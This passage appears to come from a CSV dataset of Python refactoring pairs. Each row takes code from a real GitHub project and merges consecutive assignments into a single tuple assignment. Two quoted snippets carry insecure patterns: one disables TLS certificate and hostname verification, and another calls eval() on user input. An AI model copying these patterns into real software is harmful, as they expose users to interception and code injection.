self.reason = order_dict['reason']","self.price , self.date , self.datetime , self.sending_time , self.trade_time , self.amount , self.frequence , self.market_type , self.towards , self.code , self.user_cookie , self.account_cookie , self.strategy , self.type , self.order_model , self.amount_model , self.order_id , self.realorder_id , self.trade_id , self.callback , self.commission_coeff , self.tax_coeff , self.money , self._status , self.cancel_amount , self.trade_amount , self.trade_price , self.reason  = order_dict['price'], order_dict['date'], order_dict['datetime'], order_dict['sending_time'], order_dict['trade_time'], order_dict['amount'], order_dict['frequence'], order_dict['market_type'], order_dict['towards'], order_dict['code'], order_dict['user_cookie'], order_dict['account_cookie'], order_dict['strategy'], order_dict['type'], order_dict['order_model'], order_dict['amount_model'], order_dict['order_id'], order_dict['realorder_id'], order_dict['trade_id'], order_dict['callback'], order_dict['commission_coeff'], order_dict['tax_coeff'], order_dict['money'], order_dict['_status'], order_dict['cancel_amount'], order_dict['trade_amount'], order_dict['trade_price'], order_dict['reason']"
PaddleSlim,https://github.com/PaddlePaddle/PaddleSlim/tree/master/demo/quant/quant_post/quant_post.py,,quantize$43,"def quantize(args):
    shuffle = True
    if args.ce_test:
        # set seed
        seed = 111
        np.random.seed(seed)
        paddle.seed(seed)
        random.seed(seed)
        shuffle = False

    place = paddle.CUDAPlace(0) if args.use_gpu else paddle.CPUPlace()
    val_dataset = reader.ImageNetDataset(mode='test')
    image_shape = [3, 224, 224]
    image = paddle.static.data(
        name=args.input_name, shape=[None] + image_shape, dtype='float32')
    data_loader = paddle.io.DataLoader(
        val_dataset,
        places=place,
        feed_list=[image],
        drop_last=False,
        return_list=False,
        batch_size=args.batch_size,
        shuffle=False)

    assert os.path.exists(args.model_path), ""args.model_path doesn't exist""
    assert os.path.isdir(args.model_path), ""args.model_path must be a dir""

    exe = paddle.static.Executor(place)
    quant_post_static(
        executor=exe,
        model_dir=args.model_path,
        quantize_model_path=args.save_path,
        data_loader=data_loader,
        model_filename=args.model_filename,
        params_filename=args.params_filename,
        batch_size=args.batch_size,
        batch_nums=args.batch_num,
        algo=args.algo,
        round_type=args.round_type,
        hist_percent=args.hist_percent,
        is_full_quantize=args.is_full_quantize,
        bias_correction=args.bias_correction,
        onnx_format=args.onnx_format)","place = paddle.CUDAPlace(0) if args.use_gpu else paddle.CPUPlace()
val_dataset = reader.ImageNetDataset(mode='test')
image_shape = [3, 224, 224]","place , val_dataset , image_shape  = paddle.CUDAPlace(0) if args.use_gpu else paddle.CPUPlace(), reader.ImageNetDataset(mode='test'), [3, 224, 224]"
imapfw,https://github.com/OfflineIMAP/imapfw/tree/master/imapfw/actions/testrascal.py,TestRascal,__init__$23,"def __init__(self):
        self._suite = None
        self._exitCode = -1","self._suite = None
self._exitCode = -1","self._suite , self._exitCode  = None, -1"
alexa-skills-kit-sdk-for-python,https://github.com/alexa/alexa-skills-kit-sdk-for-python/tree/master/ask-sdk-runtime/tests/unit/test_utils.py,,test_user_agent_info_with_custom_user_agent$38,"def test_user_agent_info_with_custom_user_agent():
    py_major_version = str(sys.version_info.major)
    py_minor_version = str(sys.version_info.minor)
    py_micro_version = str(sys.version_info.micro)
    custom_user_agent = ""test""

    expected_user_agent = ""ask-python/{} Python/{}.{}.{} {}"".format(
        __version__, py_major_version, py_minor_version,
        py_micro_version, custom_user_agent)
    assert user_agent_info(
        sdk_version=__version__,
        custom_user_agent=custom_user_agent) == expected_user_agent, (
        ""Incorrect User Agent info for custom user agent"")","py_major_version = str(sys.version_info.major)
py_minor_version = str(sys.version_info.minor)
py_micro_version = str(sys.version_info.micro)
custom_user_agent = 'test'","py_major_version , py_minor_version , py_micro_version , custom_user_agent  = str(sys.version_info.major), str(sys.version_info.minor), str(sys.version_info.micro), 'test'"
xlrd,https://github.com/python-excel/xlrd/tree/master/xlrd/formula.py,,get_externsheet_local_range$472,"def get_externsheet_local_range(bk, refx, blah=0):
    try:
        info = bk._externsheet_info[refx]
    except IndexError:
        print(""!!! get_externsheet_local_range: refx=%d, not in range(%d)""
            % (refx, len(bk._externsheet_info)), file=bk.logfile)
        return (-101, -101)
    ref_recordx, ref_first_sheetx, ref_last_sheetx = info
    if ref_recordx == bk._supbook_addins_inx:
        if blah:
            print(""/// get_externsheet_local_range(refx=%d) -> addins %r"" % (refx, info), file=bk.logfile)
        assert ref_first_sheetx == 0xFFFE == ref_last_sheetx
        return (-5, -5)
    if ref_recordx != bk._supbook_locals_inx:
        if blah:
            print(""/// get_externsheet_local_range(refx=%d) -> external %r"" % (refx, info), file=bk.logfile)
        return (-4, -4) # external reference
    if ref_first_sheetx == 0xFFFE == ref_last_sheetx:
        if blah:
            print(""/// get_externsheet_local_range(refx=%d) -> unspecified sheet %r"" % (refx, info), file=bk.logfile)
        return (-1, -1) # internal reference, any sheet
    if ref_first_sheetx == 0xFFFF == ref_last_sheetx:
        if blah:
            print(""/// get_externsheet_local_range(refx=%d) -> deleted sheet(s)"" % (refx, ), file=bk.logfile)
        return (-2, -2) # internal reference, deleted sheet(s)
    nsheets = len(bk._all_sheets_map)
    if not(0 <= ref_first_sheetx <= ref_last_sheetx < nsheets):
        if blah:
            print(""/// get_externsheet_local_range(refx=%d) -> %r"" % (refx, info), file=bk.logfile)
            print(""--- first/last sheet not in range(%d)"" % nsheets, file=bk.logfile)
        return (-102, -102) # stuffed up somewhere :-(
    xlrd_sheetx1 = bk._all_sheets_map[ref_first_sheetx]
    xlrd_sheetx2 = bk._all_sheets_map[ref_last_sheetx]
    if not(0 <= xlrd_sheetx1 <= xlrd_sheetx2):
        return (-3, -3) # internal reference, but to a macro sheet
    return xlrd_sheetx1, xlrd_sheetx2","xlrd_sheetx1 = bk._all_sheets_map[ref_first_sheetx]
xlrd_sheetx2 = bk._all_sheets_map[ref_last_sheetx]","xlrd_sheetx1 , xlrd_sheetx2  = bk._all_sheets_map[ref_first_sheetx], bk._all_sheets_map[ref_last_sheetx]"
video-classification-3d-cnn-pytorch,https://github.com/kenshohara/video-classification-3d-cnn-pytorch/tree/master//spatial_transforms.py,CenterCrop,__call__$164,"def __call__(self, img):
        """"""
        Args:
            img (PIL.Image): Image to be cropped.
        Returns:
            PIL.Image: Cropped image.
        """"""
        w, h = img.size
        th, tw = self.size
        x1 = int(round((w - tw) / 2.))
        y1 = int(round((h - th) / 2.))
        return img.crop((x1, y1, x1 + tw, y1 + th))","x1 = int(round((w - tw) / 2.0))
y1 = int(round((h - th) / 2.0))","x1 , y1  = int(round((w - tw) / 2.0)), int(round((h - th) / 2.0))"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","max_len = max(lengths)
source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)","max_len , source  = max(lengths), torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","batch_size = source.shape[1]
target_len = source.shape[0] + 1","batch_size , target_len  = source.shape[1], source.shape[0] + 1"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","x = torch.tensor([-1], dtype=torch.float).to(device)
predictions = torch.zeros(target_len).to(device)","x , predictions  = torch.tensor([-1], dtype=torch.float).to(device), torch.zeros(target_len).to(device)"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","outputs[t] = energy.permute(1, 0)
best_guess = attention.argmax(0)","outputs[t] , best_guess  = energy.permute(1, 0), attention.argmax(0)"
Machine-Learning-Collection,https://github.com/aladdinpersson/Machine-Learning-Collection/tree/master/ML/Projects/DeepSort/utils.py,,sort_array$10,"def sort_array(encoder, decoder, device, arr=None):
    """"""
    A very simple example of use of the model
    Input: encoder nn.Module
           decoder nn.Module
           device
           array to sort (optional)
    """"""

    if arr is None:
        arr = ask_user()

    with torch.no_grad():
        while arr != ""q"":
            # Avoid numerical errors by rounding to max_len
            arr = eval(arr)
            lengths = [
                len(str(elem).split(""."")[1]) if len(str(elem).split(""."")) > 1 else 0
                for elem in arr
            ]
            max_len = max(lengths)
            source = torch.tensor(arr, dtype=torch.float).to(device).unsqueeze(1)
            batch_size = source.shape[1]
            target_len = source.shape[0] + 1

            outputs = torch.zeros(target_len, batch_size, target_len - 1).to(device)
            encoder_states, hidden, cell = encoder(source)

            # First input will be <SOS> token
            x = torch.tensor([-1], dtype=torch.float).to(device)
            predictions = torch.zeros((target_len)).to(device)

            for t in range(1, target_len):
                # At every time step use encoder_states and update hidden, cell
                attention, energy, hidden, cell = decoder(
                    x, encoder_states, hidden, cell
                )

                # Store prediction for current time step
                outputs[t] = energy.permute(1, 0)

                # Get the best word the Decoder predicted (index in the vocabulary)
                best_guess = attention.argmax(0)
                predictions[t] = best_guess.item()
                x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)

            output = [
                round(source[predictions[1:].long()][i, :].item(), max_len)
                for i in range(source.shape[0])
            ]

            print(f""Here's the result: {output}"")
            arr = ask_user()","predictions[t] = best_guess.item()
x = torch.tensor([best_guess.item()], dtype=torch.float).to(device)","predictions[t] , x  = best_guess.item(), torch.tensor([best_guess.item()], dtype=torch.float).to(device)"
s-tui,https://github.com/amanusk/s-tui/tree/master/s_tui/sources/freq_source.py,FreqSource,__init__$29,"def __init__(self):
        self.is_available = True
        if (not hasattr(psutil, ""cpu_freq"") and
                psutil.cpu_freq()):
            self.is_available = False
            logging.debug(""cpu_freq is not available from psutil"")
            return

        Source.__init__(self)

        self.name = 'Frequency'
        self.measurement_unit = 'MHz'
        self.pallet = ('freq light', 'freq dark',
                       'freq light smooth', 'freq dark smooth')

        # Check if psutil.cpu_freq is available.
        # +1 for average frequency
        self.last_measurement = [0] * len(psutil.cpu_freq(True))
        if psutil.cpu_freq(False):
            self.last_measurement.append(0)

        self.top_freq = psutil.cpu_freq().max
        self.max_freq = self.top_freq

        if self.top_freq == 0.0:
            # If top freq not available, take the current as top
            if max(self.last_measurement) >= 0:
                self.max_freq = max(self.last_measurement)

        self.available_sensors = ['Avg']
        for core_id, _ in enumerate(psutil.cpu_freq(True)):
            self.available_sensors.append(""Core "" + str(core_id))","self.name = 'Frequency'
self.measurement_unit = 'MHz'
self.pallet = ('freq light', 'freq dark', 'freq light smooth', 'freq dark smooth')
self.last_measurement = [0] * len(psutil.cpu_freq(True))","self.name , self.measurement_unit , self.pallet , self.last_measurement  = 'Frequency', 'MHz', ('freq light', 'freq dark', 'freq light smooth', 'freq dark smooth'), [0] * len(psutil.cpu_freq(True))"
syncthing-gtk,https://github.com/kozec/syncthing-gtk/tree/master/syncthing_gtk/iddialog.py,,create_ssl_context$97,"def create_ssl_context():
	"""""" May return NULL if ssl is not available """"""
	if hasattr(ssl, ""create_default_context""):
		ctx = ssl.create_default_context()
		ctx.check_hostname = False
		ctx.verify_mode = ssl.CERT_NONE
	else:
		log.warning(""SSL is not available, cannot verify server certificate."")","ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE","ctx.check_hostname , ctx.verify_mode  = False, ssl.CERT_NONE"
rotki,https://github.com/rotki/rotki/tree/master/rotkehlchen/tests/api/test_exchanges.py,,test_exchange_query_balances$482,"def test_exchange_query_balances(rotkehlchen_api_server_with_exchanges):
    """"""Test that using the exchange balances query endpoint works fine""""""
    async_query = random.choice([False, True])
    rotki = rotkehlchen_api_server_with_exchanges.rest_api.rotkehlchen
    # query balances of one specific exchange
    server = rotkehlchen_api_server_with_exchanges
    binance = try_get_first_exchange(rotki.exchange_manager, Location.BINANCE)

    binance_patch = patch_binance_balances_query(binance)
    with binance_patch:
        response = requests.get(api_url_for(
            server,
            'named_exchanges_balances_resource',
            location='binance',
        ), json={'async_query': async_query})
        if async_query:
            task_id = assert_ok_async_response(response)
            outcome = wait_for_async_task_with_result(server, task_id)
        else:
            outcome = assert_proper_response_with_result(response)
    assert_binance_balances_result(outcome)

    # query balances of all setup exchanges
    poloniex = try_get_first_exchange(rotki.exchange_manager, Location.POLONIEX)
    poloniex_patch = patch_poloniex_balances_query(poloniex)
    with binance_patch, poloniex_patch:
        response = requests.get(
            api_url_for(server, 'exchangebalancesresource'),
            json={'async_query': async_query},
        )
        if async_query:
            task_id = assert_ok_async_response(response)
            result = wait_for_async_task_with_result(server, task_id)
        else:
            result = assert_proper_response_with_result(response)

    assert_binance_balances_result(result['binance'])
    assert_poloniex_balances_result(result['poloniex'])","async_query = random.choice([False, True])
rotki = rotkehlchen_api_server_with_exchanges.rest_api.rotkehlchen","async_query , rotki  = random.choice([False, True]), rotkehlchen_api_server_with_exchanges.rest_api.rotkehlchen"
rotki,https://github.com/rotki/rotki/tree/master/rotkehlchen/tests/api/test_exchanges.py,,test_exchange_query_balances$482,"def test_exchange_query_balances(rotkehlchen_api_server_with_exchanges):
    """"""Test that using the exchange balances query endpoint works fine""""""
    async_query = random.choice([False, True])
    rotki = rotkehlchen_api_server_with_exchanges.rest_api.rotkehlchen
    # query balances of one specific exchange
    server = rotkehlchen_api_server_with_exchanges
    binance = try_get_first_exchange(rotki.exchange_manager, Location.BINANCE)

    binance_patch = patch_binance_balances_query(binance)
    with binance_patch:
        response = requests.get(api_url_for(
            server,
            'named_exchanges_balances_resource',
            location='binance',
        ), json={'async_query': async_query})
        if async_query:
            task_id = assert_ok_async_response(response)
            outcome = wait_for_async_task_with_result(server, task_id)
        else:
            outcome = assert_proper_response_with_result(response)
    assert_binance_balances_result(outcome)

    # query balances of all setup exchanges
    poloniex = try_get_first_exchange(rotki.exchange_manager, Location.POLONIEX)
    poloniex_patch = patch_poloniex_balances_query(poloniex)
    with binance_patch, poloniex_patch:
        response = requests.get(
            api_url_for(server, 'exchangebalancesresource'),
            json={'async_query': async_query},
        )
        if async_query:
            task_id = assert_ok_async_response(response)
            result = wait_for_async_task_with_result(server, task_id)
        else:
            result = assert_proper_response_with_result(response)

    assert_binance_balances_result(result['binance'])
    assert_poloniex_balances_result(result['poloniex'])","server = rotkehlchen_api_server_with_exchanges
binance = try_get_first_exchange(rotki.exchange_manager, Location.BINANCE)","server , binance  = rotkehlchen_api_server_with_exchanges, try_get_first_exchange(rotki.exchange_manager, Location.BINANCE)"
alexa-skills-kit-sdk-for-python,https://github.com/alexa/alexa-skills-kit-sdk-for-python/tree/master/ask-sdk/tests/unit/test_standard.py,TestStandardSkillBuilder,test_persistence_adapter_set$49,"def test_persistence_adapter_set(self):
        test_table_name = ""TestTable""
        test_dynamodb_resource = mock.Mock()
        test_partition_keygen = mock.Mock()
        test_auto_create_table = False

        test_skill_builder = StandardSkillBuilder(
            table_name=test_table_name,
            auto_create_table=test_auto_create_table,
            partition_keygen=test_partition_keygen,
            dynamodb_client=test_dynamodb_resource)

        actual_skill_config = test_skill_builder.skill_configuration
        actual_adapter = actual_skill_config.persistence_adapter

        assert isinstance(
            actual_adapter, DynamoDbAdapter), (
            ""Standard Skill Builder set incorrect persistence adapter in ""
            ""skill configuration"")

        assert actual_adapter.table_name == test_table_name, (
            ""Standard Skill Builder set persistence adapter with incorrect ""
            ""table name in skill configuration"")
        assert actual_adapter.partition_keygen == test_partition_keygen, (
            ""Standard Skill Builder set persistence adapter with incorrect ""
            ""partition key generator function in skill configuration"")
        assert actual_adapter.create_table == test_auto_create_table, (
            ""Standard Skill Builder set persistence adapter with incorrect ""
            ""auto create table flag in skill configuration"")
        assert actual_adapter.dynamodb == test_dynamodb_resource, (
            ""Standard Skill Builder set persistence adapter with incorrect ""
            ""dynamo db resource in skill configuration"")","test_table_name = 'TestTable'
test_dynamodb_resource = mock.Mock()
test_partition_keygen = mock.Mock()
test_auto_create_table = False","test_table_name , test_dynamodb_resource , test_partition_keygen , test_auto_create_table  = 'TestTable', mock.Mock(), mock.Mock(), False"
hand-graph-cnn,https://github.com/3d-hand-shape/hand-graph-cnn/tree/master/hand_shape_pose/data/dataset/STB_dataset.py,,SK_rot_mx$35,"def SK_rot_mx(rot_vec):
    """"""
    use Rodrigues' rotation formula to transform the rotation vector into rotation matrix
    :param rot_vec:
    :return:
    """"""
    theta = LA.norm(rot_vec)
    vector = np.array(rot_vec) * math.sin(theta / 2.0) / theta
    a = math.cos(theta / 2.0)
    b = -vector[0]
    c = -vector[1]
    d = -vector[2]
    return np.array([[a * a + b * b - c * c - d * d, 2 * (b * c + a * d), 2 * (b * d - a * c)],
                     [2 * (b * c - a * d), a * a + c * c - b * b - d * d, 2 * (c * d + a * b)],
                     [2 * (b * d + a * c), 2 * (c * d - a * b), a * a + d * d - b * b - c * c]])","a = math.cos(theta / 2.0)
b = -vector[0]
c = -vector[1]
d = -vector[2]","a , b , c , d  = math.cos(theta / 2.0), -vector[0], -vector[1], -vector[2]"
espnet,https://github.com/espnet/espnet/tree/master/espnet2/gan_tts/joint/joint_text2wav.py,JointText2Wav,_forward_discrminator$511,"def _forward_discrminator(
        self,
        text: torch.Tensor,
        text_lengths: torch.Tensor,
        feats: torch.Tensor,
        feats_lengths: torch.Tensor,
        speech: torch.Tensor,
        speech_lengths: torch.Tensor,
        **kwargs,
    ) -> Dict[str, Any]:
        """"""Perform discriminator forward.

        Args:
            text (Tensor): Text index tensor (B, T_text).
            text_lengths (Tensor): Text length tensor (B,).
            feats (Tensor): Feature tensor (B, T_feats, aux_channels).
            feats_lengths (Tensor): Feature length tensor (B,).
            speech (Tensor): Speech waveform tensor (B, T_wav).
            speech_lengths (Tensor): Speech length tensor (B,).

        Returns:
            Dict[str, Any]:
                * loss (Tensor): Loss scalar tensor.
                * stats (Dict[str, float]): Statistics to be monitored.
                * weight (Tensor): Weight tensor to summarize losses.
                * optim_idx (int): Optimizer index (0 for G and 1 for D).

        """"""
        # setup
        batch_size = text.size(0)
        speech = speech.unsqueeze(1)

        # calculate generator outputs
        reuse_cache = True
        if not self.cache_generator_outputs or self._cache is None:
            reuse_cache = False
            # calculate text2mel outputs
            text2mel_loss, stats, feats_gen = self.generator[""text2mel""](
                text=text,
                text_lengths=text_lengths,
                feats=feats,
                feats_lengths=feats_lengths,
                joint_training=True,
                **kwargs,
            )
            # get random segments
            feats_gen_, start_idxs = get_random_segments(
                x=feats_gen.transpose(1, 2),
                x_lengths=feats_lengths,
                segment_size=self.segment_size,
            )
            # calculate vocoder outputs
            speech_hat_ = self.generator[""vocoder""](feats_gen_)
            if self.use_pqmf:
                speech_hat_ = self.pqmf.synthesis(speech_hat_)
        else:
            _, _, speech_hat_, start_idxs = self._cache

        # store cache
        if self.cache_generator_outputs and not reuse_cache:
            self._cache = (text2mel_loss, stats, speech_hat_, start_idxs)

        # parse outputs
        speech_ = get_segments(
            x=speech,
            start_idxs=start_idxs * self.generator[""vocoder""].upsample_factor,
            segment_size=self.segment_size * self.generator[""vocoder""].upsample_factor,
        )

        # calculate discriminator outputs
        p_hat = self.discriminator(speech_hat_.detach())
        p = self.discriminator(speech_)

        # calculate losses
        real_loss, fake_loss = self.discriminator_adv_loss(p_hat, p)
        loss = real_loss + fake_loss

        stats = dict(
            discriminator_loss=loss.item(),
            real_loss=real_loss.item(),
            fake_loss=fake_loss.item(),
        )
        loss, stats, weight = force_gatherable((loss, stats, batch_size), loss.device)

        # reset cache
        if reuse_cache or not self.training:
            self._cache = None

        return {
            ""loss"": loss,
            ""stats"": stats,
            ""weight"": weight,
            ""optim_idx"": 1,  # needed for trainer
        }","batch_size = text.size(0)
speech = speech.unsqueeze(1)
reuse_cache = True","batch_size , speech , reuse_cache  = text.size(0), speech.unsqueeze(1), True"
espnet,https://github.com/espnet/espnet/tree/master/espnet2/gan_tts/joint/joint_text2wav.py,JointText2Wav,_forward_discrminator$511,"def _forward_discrminator(
        self,
        text: torch.Tensor,
        text_lengths: torch.Tensor,
        feats: torch.Tensor,
        feats_lengths: torch.Tensor,
        speech: torch.Tensor,
        speech_lengths: torch.Tensor,
        **kwargs,
    ) -> Dict[str, Any]:
        """"""Perform discriminator forward.

        Args:
            text (Tensor): Text index tensor (B, T_text).
            text_lengths (Tensor): Text length tensor (B,).
            feats (Tensor): Feature tensor (B, T_feats, aux_channels).
            feats_lengths (Tensor): Feature length tensor (B,).
            speech (Tensor): Speech waveform tensor (B, T_wav).
            speech_lengths (Tensor): Speech length tensor (B,).

        Returns:
            Dict[str, Any]:
                * loss (Tensor): Loss scalar tensor.
                * stats (Dict[str, float]): Statistics to be monitored.
                * weight (Tensor): Weight tensor to summarize losses.
                * optim_idx (int): Optimizer index (0 for G and 1 for D).

        """"""
        # setup
        batch_size = text.size(0)
        speech = speech.unsqueeze(1)

        # calculate generator outputs
        reuse_cache = True
        if not self.cache_generator_outputs or self._cache is None:
            reuse_cache = False
            # calculate text2mel outputs
            text2mel_loss, stats, feats_gen = self.generator[""text2mel""](
                text=text,
                text_lengths=text_lengths,
                feats=feats,
                feats_lengths=feats_lengths,
                joint_training=True,
                **kwargs,
            )
            # get random segments
            feats_gen_, start_idxs = get_random_segments(
                x=feats_gen.transpose(1, 2),
                x_lengths=feats_lengths,
                segment_size=self.segment_size,
            )
            # calculate vocoder outputs
            speech_hat_ = self.generator[""vocoder""](feats_gen_)
            if self.use_pqmf:
                speech_hat_ = self.pqmf.synthesis(speech_hat_)
        else:
            _, _, speech_hat_, start_idxs = self._cache

        # store cache
        if self.cache_generator_outputs and not reuse_cache:
            self._cache = (text2mel_loss, stats, speech_hat_, start_idxs)

        # parse outputs
        speech_ = get_segments(
            x=speech,
            start_idxs=start_idxs * self.generator[""vocoder""].upsample_factor,
            segment_size=self.segment_size * self.generator[""vocoder""].upsample_factor,
        )

        # calculate discriminator outputs
        p_hat = self.discriminator(speech_hat_.detach())
        p = self.discriminator(speech_)

        # calculate losses
        real_loss, fake_loss = self.discriminator_adv_loss(p_hat, p)
        loss = real_loss + fake_loss

        stats = dict(
            discriminator_loss=loss.item(),
            real_loss=real_loss.item(),
            fake_loss=fake_loss.item(),
        )
        loss, stats, weight = force_gatherable((loss, stats, batch_size), loss.device)

        # reset cache
        if reuse_cache or not self.training:
            self._cache = None

        return {
            ""loss"": loss,
            ""stats"": stats,
            ""weight"": weight,
            ""optim_idx"": 1,  # needed for trainer
        }","p_hat = self.discriminator(speech_hat_.detach())
p = self.discriminator(speech_)","p_hat , p  = self.discriminator(speech_hat_.detach()), self.discriminator(speech_)"
smart_login,https://github.com/SpiderClub/smart_login/tree/master/sina_login/sina_login_direct.py,,get_pincode_url$28,"def get_pincode_url(pcid):
    size = 0
    url = ""http://login.sina.com.cn/cgi/pin.php""
    pincode_url = '{}?r={}&s={}&p={}'.format(url, math.floor(random.random() * 100000000), size, pcid)
    return pincode_url","size = 0
url = 'http://login.sina.com.cn/cgi/pin.php'","size , url  = 0, 'http://login.sina.com.cn/cgi/pin.php'"
veusz,https://github.com/veusz/veusz/tree/master/veusz/document/svg_export.py,SVGPaintEngine,__init__$141,"def __init__(self, writetextastext=False):
        qt.QPaintEngine.__init__(
            self,
            qt.QPaintEngine.Antialiasing |
            qt.QPaintEngine.PainterPaths |
            qt.QPaintEngine.PrimitiveTransform |
            qt.QPaintEngine.PaintOutsidePaintEvent |
            qt.QPaintEngine.PixmapTransform |
            qt.QPaintEngine.AlphaBlend
        )

        self.imageformat = 'png'
        self.writetextastext = writetextastext","self.imageformat = 'png'
self.writetextastext = writetextastext","self.imageformat , self.writetextastext  = 'png', writetextastext"
transformers,https://github.com/huggingface/transformers/tree/master/src/transformers/models/cpm/tokenization_cpm_fast.py,CpmTokenizerFast,build_inputs_with_special_tokens$157,"def build_inputs_with_special_tokens(
        self, token_ids_0: List[int], token_ids_1: Optional[List[int]] = None
    ) -> List[int]:
        """"""
        Build model inputs from a sequence or a pair of sequence for sequence classification tasks by concatenating and
        adding special tokens. An XLNet sequence has the following format:

        - single sequence: `X <sep> <cls>`
        - pair of sequences: `A <sep> B <sep> <cls>`

        Args:
            token_ids_0 (`List[int]`):
                List of IDs to which the special tokens will be added.
            token_ids_1 (`List[int]`, *optional*):
                Optional second list of IDs for sequence pairs.

        Returns:
            `List[int]`: List of [input IDs](../glossary#input-ids) with the appropriate special tokens.
        """"""
        sep = [self.sep_token_id]
        cls = [self.cls_token_id]
        if token_ids_1 is None:
            return token_ids_0 + sep + cls
        return token_ids_0 + sep + token_ids_1 + sep + cls","sep = [self.sep_token_id]
